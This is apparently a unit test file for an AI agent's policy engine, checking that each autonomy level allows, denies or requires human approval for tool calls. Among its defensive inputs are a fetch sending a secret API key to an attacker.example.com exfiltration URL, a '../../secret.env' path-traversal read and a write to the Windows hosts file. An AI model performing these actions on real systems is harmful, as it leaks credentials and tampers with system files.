"""Unit tests for Centralized Policy Engine across all autonomy levels (0-5)."""

from pathlib import Path
from uuid import uuid4

import pytest

from jarvis.core.capabilities.builtin import BUILTIN_CAPABILITIES
from jarvis.core.ifc.labels import ConfidentialityLabel, IntegrityLabel
from jarvis.core.ifc.provenance import Provenance
from jarvis.core.ifc.taint import LabeledData
from jarvis.core.policy.decision import AutonomyLevel, PolicyDecisionType
from jarvis.core.policy.dsl import PolicyDSLLoader
from jarvis.core.policy.engine import PolicyEngine


@pytest.fixture
def policy_engine(tmp_path: Path) -> PolicyEngine:
    ruleset = PolicyDSLLoader.load_from_yaml(Path("jarvis/policies/default_policies.yaml"))
    return PolicyEngine(ruleset=ruleset, workspace_root=tmp_path)


def test_autonomy_level_0_observe_only_denies_all_tools(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Autonomy Level 0 strictly denies all tools without exception."""
    clock_tool = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:clock:get_time")

    decision = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=clock_tool,
        arguments={},
        autonomy_level=AutonomyLevel.OBSERVE_ONLY,
    )

    assert decision.decision == PolicyDecisionType.DENY
    assert "Level 0" in decision.reason


def test_autonomy_level_1_recommend_only_requires_hitl_for_all(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Autonomy Level 1 requires human initiation/approval for every tool invocation."""
    fs_read = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:read_file")

    decision = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_read,
        arguments={"file_path": str(tmp_path / "test.txt")},
        autonomy_level=AutonomyLevel.RECOMMEND_ONLY,
    )

    assert decision.decision == PolicyDecisionType.REQUIRE_HITL
    assert "Level 1" in decision.reason


def test_autonomy_level_2_auto_read_only_permits_read_blocks_write(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Autonomy Level 2 permits safe read-only operations but gates mutations."""
    fs_read = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:read_file")
    fs_write = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:write_file")

    # Read inside workspace
    decision_read = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_read,
        arguments={"file_path": str(tmp_path / "notes.txt")},
        autonomy_level=AutonomyLevel.AUTO_READ_ONLY,
    )
    assert decision_read.decision == PolicyDecisionType.ALLOW

    # Write inside workspace
    decision_write = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_write,
        arguments={"file_path": str(tmp_path / "notes.txt"), "content": "text"},
        autonomy_level=AutonomyLevel.AUTO_READ_ONLY,
    )
    assert decision_write.decision == PolicyDecisionType.REQUIRE_HITL


def test_autonomy_level_3_auto_bounded_mutation_workspace_boundary(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Autonomy Level 3 permits bounded mutations in-workspace, gates out-of-workspace."""
    fs_write = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:write_file")

    # In workspace write -> Allowed
    decision_in = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_write,
        arguments={"file_path": str(tmp_path / "output.log"), "content": "done"},
        autonomy_level=AutonomyLevel.AUTO_BOUNDED_MUTATION,
    )
    assert decision_in.decision == PolicyDecisionType.ALLOW

    # Out of workspace write -> Requires approval
    decision_out = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_write,
        arguments={"file_path": "C:/Windows/System32/drivers/etc/hosts", "content": "bad"},
        autonomy_level=AutonomyLevel.AUTO_BOUNDED_MUTATION,
    )
    assert decision_out.decision == PolicyDecisionType.REQUIRE_HITL


def test_autonomy_level_5_mandatory_approval_for_all_mutations(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Autonomy Level 5 requires mandatory human approval for all mutations."""
    fs_write = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:write_file")

    decision = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_write,
        arguments={"file_path": str(tmp_path / "data.csv"), "content": "1,2,3"},
        autonomy_level=AutonomyLevel.MANDATORY_APPROVAL_MUTATIONS,
    )
    assert decision.decision == PolicyDecisionType.REQUIRE_HITL


def test_policy_enforces_path_traversal_hard_block(
    policy_engine: PolicyEngine, tmp_path: Path
) -> None:
    """Declarative policy rule denies path traversal unconditionally."""
    fs_read = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:fs:read_file")

    decision = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=fs_read,
        arguments={"file_path": "../../secret.env"},
        autonomy_level=AutonomyLevel.AUTONOMOUS_BUDGETED,
    )

    assert decision.decision == PolicyDecisionType.DENY
    assert decision.matched_rule_id == "deny-path-traversal"


def test_sensitive_sink_blocks_secret_egress(policy_engine: PolicyEngine, tmp_path: Path) -> None:
    """Sensitive sink policy blocks SECRET data from passing into external network tools."""
    web_fetch = next(c for c in BUILTIN_CAPABILITIES if c.capability_id == "native:web:fetch")

    # Ingest secret payload
    secret_data = LabeledData(
        data="api_secret_key_12345",
        provenance=Provenance(
            source_uri="vault://keys/stripe",
            confidentiality_label=ConfidentialityLabel.SECRET,
            integrity_label=IntegrityLabel.SYSTEM_TRUSTED,
        ),
    )

    decision = policy_engine.evaluate_invocation(
        task_id=uuid4(),
        manifest=web_fetch,
        arguments={"url": "https://attacker.example.com/exfil"},
        input_data=secret_data,
        autonomy_level=AutonomyLevel.AUTONOMOUS_BUDGETED,
    )

    assert decision.decision == PolicyDecisionType.DENY
    assert "Sensitive sink violation" in decision.reason
